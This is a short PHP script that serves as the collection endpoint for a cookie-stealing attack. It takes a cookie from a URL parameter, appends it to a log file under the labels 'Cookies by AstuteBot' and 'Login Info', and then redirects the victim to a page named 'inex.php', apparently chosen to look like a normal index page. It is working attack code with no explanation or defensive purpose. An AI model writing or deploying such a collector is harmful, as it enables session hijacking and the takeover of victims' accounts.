<?php
 session_start();
$cookie = $_GET['c'];
$fp = fopen('Meta/Benchmark/log.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'
END OF COOKIE'.'
Cookies by AstuteBot'.'
'.'
Login Info'.'
');
 $_SESSION['c'] = $_POST['c'];
header("Location: inex.php"); ?>



?>
